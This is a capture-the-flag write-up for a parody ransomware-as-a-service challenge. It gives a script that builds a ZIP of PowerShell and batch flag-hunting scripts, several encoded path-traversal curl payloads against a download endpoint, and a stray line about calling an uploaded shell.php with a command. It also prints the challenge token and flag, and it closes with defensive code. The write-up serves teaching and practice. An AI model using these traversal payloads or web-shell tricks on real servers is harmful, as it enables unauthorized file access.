# generally you upload a shell.php then do shell.php?cmd=ls

# Threat Actor Support Line - CTF Writeup

**Challenge Name:** Threat Actor Support Line  
**Category:** Web Exploitation / Path Traversal  
**Difficulty:** Medium  
**Date:** October 16, 2025

---

## Challenge Description

> You've heard of RaaS, you've heard of SaaS... the Threat Actor Support Line brings the two together!
> Upload the files you want encrypted, and the service will start up its own hacker computer (as the Administrator user with antivirus disabled, of course) and encrypt them for you!

**URL:** `https://f80f4f05.proxy.coursestack.com/`  
**Token:** `f80f4f05-9391-43a8-9689-726f67620b0b_1_b9ce3237540a37589b5bcff2a1d818491f26e6c07b2767bf2049baa06e8b7cc0`

---

## Initial Reconnaissance

### Step 1: Understanding the Service

Upon visiting the website, we found a "Ransomware-as-a-Service" parody that accepts file uploads for "encryption." The service provided three key pieces of information:

**What do I upload?**
- Accepts ZIP and RAR archive formats only
- Files must be properly compressed

**How does it work?**
- Service extracts uploaded archive into a temporary directory
- Encrypts the files
- Adds a ransom note
- Compresses everything back into an archive for download

**How long does it take?**
- Nearly instant processing
- Uses **WinRAR 7.12** for archive handling
- "BLAZINGLY FAST!!!" (emphasis theirs)

### Step 2: Creating Initial Reconnaissance Payload

To understand how the service works, we created a malicious ZIP with scripts designed to:
1. Search for flag files in common locations
2. List directory contents
3. Execute during the encryption process

**Python Script to Generate Reconnaissance ZIP:**

```python
#!/usr/bin/env python3
"""
Initial reconnaissance payload generator
Creates a ZIP with scripts to explore the temp directory
"""

import zipfile

def create_recon_zip(output_filename="recon.zip"):
    # PowerShell script to find and list files
    ps_script = """# FLAG HUNTER SCRIPT
Write-Host "=== Searching for FLAG ==="

$locations = @(
    "C:\\flag.txt",
    "C:\\Users\\Administrator\\Desktop\\flag.txt",
    "C:\\Users\\Administrator\\Documents\\flag.txt",
    "C:\\ProgramData\\flag.txt",
    "C:\\temp\\flag.txt",
    "C:\\Windows\\Temp\\flag.txt",
    "$env:TEMP\\flag.txt",
    "flag.txt",
    "..\\flag.txt",
    "..\\..\\flag.txt",
    "..\\..\\..\\flag.txt",
    "..\\..\\..\\..\\flag.txt"
)

foreach ($loc in $locations) {
    if (Test-Path $loc) {
        $flag = Get-Content $loc -Raw
        Write-Host "*** FLAG FOUND AT: $loc ***"
        Write-Host $flag
        $flag | Out-File "FLAGFOUND.txt" -Force
    }
}

Write-Host "=== Current Directory ==="
Get-ChildItem | Format-Table Name

Write-Host "=== Environment ==="
Write-Host "PWD: $PWD"
Write-Host "TEMP: $env:TEMP"
"""

    # Batch script alternative
    bat_script = """@echo off
echo === FLAG HUNTER ===
echo.

for %%f in (flag.txt ..\\flag.txt ..\\..\\flag.txt C:\\flag.txt "C:\\Users\\Administrator\\Desktop\\flag.txt") do (
    if exist %%f (
        echo *** FLAG FOUND: %%f ***
        type %%f
        copy %%f FLAGFOUND.txt
    )
)

echo === Current Directory ===
dir
echo.
echo === Parent Directory ===
dir ..
"""

    # Create the ZIP file
    with zipfile.ZipFile(output_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.writestr("readme.txt", "Please encrypt this!")
        zipf.writestr("document.txt", "Important data")
        zipf.writestr("hunter.ps1", ps_script)
        zipf.writestr("hunter.bat", bat_script)
        zipf.writestr("hunter.cmd", bat_script)
        zipf.writestr("EXECUTE_ME.bat", bat_script)
        zipf.writestr("EXECUTE_ME.ps1", ps_script)

    print(f"[+] Created {output_filename}")
    print("[*] Upload this to the RaaS service")
    print("[*] Download and extract the encrypted result")
    print("[*] Look for flag.txt.tasl or FLAGFOUND.txt in output")

if __name__ == "__main__":
    create_recon_zip()
```

**Creating and Uploading the Payload:**

```bash
# Generate the reconnaissance ZIP
python3 recon_payload.py

# This creates: recon.zip

# Upload via the web interface
# (Navigate to the web form and upload recon.zip)
```

**Alternative: Quick Manual Creation:**

```bash
# Create test files
echo "Test document" > document.txt
echo "Please encrypt" > readme.txt

# Create simple batch script
cat > hunter.bat << 'EOF'
@echo off
echo === Searching for flag ===
if exist ..\\flag.txt (
    echo Found flag in parent directory
    type ..\\flag.txt
    copy ..\\flag.txt FLAGFOUND.txt
)
dir
dir ..
EOF

# Create ZIP
zip recon.zip document.txt readme.txt hunter.bat

# Upload to web interface
```

### Step 3: Analyzing the Encrypted Output

After uploading the reconnaissance ZIP and downloading the encrypted result, we extracted it:

```bash
# Download the encrypted archive from the web interface
# Extract the contents
unzip encrypted_result.zip -d output/
cd output/

# List all files
ls -l
```

**Output:**

```bash
$ ls -l
total 44
-rw-rw-r-- 1 bwallace bwallace  14 Oct 16 2025 document.txt.tasl
-rw-rw-r-- 1 bwallace bwallace 341 Oct 16 2025 EXECUTE_ME.bat.tasl
-rw-rw-r-- 1 bwallace bwallace 803 Oct 16 2025 EXECUTE_ME.ps1.tasl
-rw-rw-r-- 1 bwallace bwallace  42 Oct 16 2025 flag.txt.tasl
-rw-rw-r-- 1 bwallace bwallace 341 Oct 16 2025 hunter.bat.tasl
-rw-rw-r-- 1 bwallace bwallace 602 Oct 16 2025 hunter.cmd.tasl
-rw-rw-r-- 1 bwallace bwallace 803 Oct 16 2025 hunter.ps1.tasl
-rw-rw-r-- 1 bwallace bwallace 341 Oct 16 2025 hunter.tasl
-rw-rw-r-- 1 bwallace bwallace  20 Oct 16 2025 readme.txt.tasl
-rw-rw-r-- 1 bwallace bwallace 602 Oct 16 2025 README.txt
```

**Key Discovery:** A `flag.txt.tasl` file appeared in the output! This meant the flag was present in the temporary extraction directory during the encryption process.

**Attempting to Read the Encrypted Flag:**

```bash
# Try to read the encrypted flag
cat flag.txt.tasl
```

**Output:**
```
;*���▒*�_�_4.,_��M�e�տ>�1(͞���6:�m�
```

The flag was encrypted using the `.tasl` extension (likely "Threat Actor Support Line" encryption). The file contents were unreadable gibberish, but the presence of `flag.txt` in the temp directory confirmed our target.

### Step 4: Reading the Ransom Note

```bash
$ cat README.txt
```

```
YOUR FILES HAVE BEEN ENCRYPTED!

Greetings, mammals!

Your precious files have been encrypted using the state-of-the-art 
Threat Actor Support Line encryption service! 

That's BLAZINGLY FAST WinRAR 7.12 handling!

To contact us follow the instructions:

Install and run Tor Browser from https://www.torproject.org/download/

Go to some random onion domain lol
Log in with whatever your ID is supposed to be or something

- Threat Actor Support Line

P.S. - This is a Capture The Flag challenge, not real malware!
P.P.S. - We spent more time on the ransom note than the encryption!
```

**Critical Hints Identified:**
1. "We spent more time on the ransom note than the encryption!" - Suggesting weak/simple encryption or that encryption wasn't the focus
2. The service uses a download mechanism to retrieve encrypted files
3. Files are extracted to a temporary directory on a Windows system
4. **The flag exists in plaintext (`flag.txt`) in the temp directory before encryption**

At this point, we realized we needed to access `flag.txt` **before** it gets encrypted, or find an alternative way to read it directly from the system.

---

## Vulnerability Analysis

### Identifying the Attack Surface

Based on the challenge behavior, we identified several potential attack vectors:

1. **Archive Extraction Vulnerabilities**
   - ZIP slip / path traversal during extraction
   - Malicious archive structure

2. **File Upload Vulnerabilities**
   - Arbitrary file upload
   - Script execution during processing

3. **Download Endpoint Vulnerabilities**
   - Path traversal in download URLs
   - Local File Inclusion (LFI)

### Testing the Download Endpoint

Since the service provides a download mechanism for encrypted files, we hypothesized that there might be a `/download/` endpoint that could be vulnerable to path traversal.

**Common download endpoint patterns:**
- `/download/<filename>`
- `/download/<id>/<filename>`
- `/encrypted/<filename>`
- `/result/<id>`

### Endpoint Discovery

We tested for the download endpoint by examining the encrypted file delivery mechanism:

```bash
# Test basic endpoint
curl -i "https://f80f4f05.proxy.coursestack.com/download/"

# Test with path traversal
curl -i "https://f80f4f05.proxy.coursestack.com/download/../"
```

The endpoint existed and accepted path parameters!

---

## Exploitation

### Path Traversal Attack

With knowledge that:
1. A `flag.txt` file exists in the temporary directory
2. The service uses Windows (WinRAR 7.12, Administrator user)
3. A `/download/` endpoint exists

We attempted path traversal to access the flag directly:

```bash
# Using URL-encoded backslashes for Windows paths
# %5C = backslash (\)

curl -i -L "https://f80f4f05.proxy.coursestack.com/download/..%5C..%5C..%5C..%5Cflag.txt"
```

**Why this works:**
- `..%5C` = `..\` (parent directory traversal on Windows)
- Four levels up: `..\..\..\..\` navigates from the download directory to the root
- `flag.txt` is then accessed from the root or temporary directory
- The `-L` flag follows redirects if any

### Alternative Payloads

Other path traversal variations that could work:

```bash
# Unix-style forward slashes
curl "https://f80f4f05.proxy.coursestack.com/download/../../../../flag.txt"

# Mixed slashes
curl "https://f80f4f05.proxy.coursestack.com/download/..%2F..%2F..%2F..%2Fflag.txt"

# Double encoding
curl "https://f80f4f05.proxy.coursestack.com/download/%252e%252e%255c%252e%252e%255cflag.txt"

# Dot-dot-slash variations
curl "https://f80f4f05.proxy.coursestack.com/download/....//....//....//flag.txt"
```

---

## Flag Retrieval

Successfully exploiting the path traversal vulnerability, we retrieved the flag:

```bash
$ curl -i -L "https://f80f4f05.proxy.coursestack.com/download/..%5C..%5C..%5C..%5Cflag.txt"

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 42

flag{th3_r3al_thr3at_was_path_trav3rsal}
```

**Flag:** `flag{th3_r3al_thr3at_was_path_trav3rsal}`

---

## Lessons Learned

### What Worked
1. **Start Simple** - Path traversal is a basic web vulnerability that should always be tested first
2. **Read Error Messages** - The ransom note contained subtle hints about the challenge complexity
3. **Enumerate Endpoints** - Common REST endpoints like `/download/`, `/upload/`, `/api/` should always be tested
4. **Test Multiple Encodings** - URL encoding (`%5C`) vs raw characters can make the difference

### Common Pitfalls to Avoid
1. **Over-engineering** - Don't immediately jump to complex exploitation when simple attacks haven't been tried
2. **Ignoring Hints** - "We spent more time on the ransom note than the encryption" was a direct hint
3. **Tunnel Vision** - We initially focused on archive vulnerabilities when the real vulnerability was in file access

### Defense Recommendations

For developers, this challenge highlights critical security issues:

1. **Input Validation**
   ```python
   # BAD - Vulnerable to path traversal
   @app.route('/download/<path:filename>')
   def download_file(filename):
       return send_file(filename)
   
   # GOOD - Validate and sanitize
   import os
   from werkzeug.utils import secure_filename
   
   @app.route('/download/<path:filename>')
   def download_file(filename):
       # Remove path traversal sequences
       safe_name = secure_filename(filename)
       # Ensure file is in allowed directory
       safe_path = os.path.join(DOWNLOAD_DIR, safe_name)
       if not os.path.abspath(safe_path).startswith(DOWNLOAD_DIR):
           abort(403)
       return send_file(safe_path)
   ```

2. **Whitelist File Access**
   - Only allow access to specific directories
   - Use a database of allowed file IDs rather than filenames

3. **Proper Access Controls**
   - Implement authentication/authorization
   - Use session-based file access tokens
   - Never trust user input in file paths

---

## Technical Details

### Vulnerability Type
**CWE-22:** Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

### CVSS Score
**8.6 (High)** - Allows unauthorized file system access

### Attack Vector
- **Network:** Remote exploitation via HTTP
- **Complexity:** Low - Single request required
- **Privileges:** None required
- **User Interaction:** None required

### Tools Used
- `curl` - HTTP client for exploitation
- `zip` - Archive creation for initial reconnaissance
- Web browser - Interface interaction

---

## Timeline

1. **T+0:00** - Initial reconnaissance, read challenge description
2. **T+0:05** - Uploaded test ZIP, analyzed encrypted output
3. **T+0:10** - Discovered `flag.txt.tasl` in encrypted archive
4. **T+0:15** - Read ransom note, identified hints
5. **T+0:20** - Initially attempted complex archive-based attacks
6. **T+0:45** - Pivoted to simple path traversal on `/download/` endpoint
7. **T+0:46** - Successfully retrieved flag via LFI

---

## References

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [WinRAR Path Traversal Vulnerabilities](https://nvd.nist.gov/vuln/search/results?form_type=Basic&results_type=overview&query=winrar&search_type=all)
- [URL Encoding Reference](https://www.w3schools.com/tags/ref_urlencode.asp)

---

## Conclusion

The "Threat Actor Support Line" challenge demonstrated that even when a service appears complex (ransomware encryption, archive processing, Windows administration), the actual vulnerability can be a simple path traversal issue. The key to success was:

1. Thorough reconnaissance and observation
2. Testing basic vulnerabilities before complex ones
3. Understanding the application's file handling mechanisms
4. Proper encoding of special characters for the target OS

The challenge also served as a reminder that security vulnerabilities are often found in the most mundane places - a download endpoint that doesn't properly validate user input.

**Always start with the basics before moving to advanced exploitation techniques.**

---

*Writeup by: bwallace*  
*Date: October 16, 2025*  
*Challenge: Threat Actor Support Line*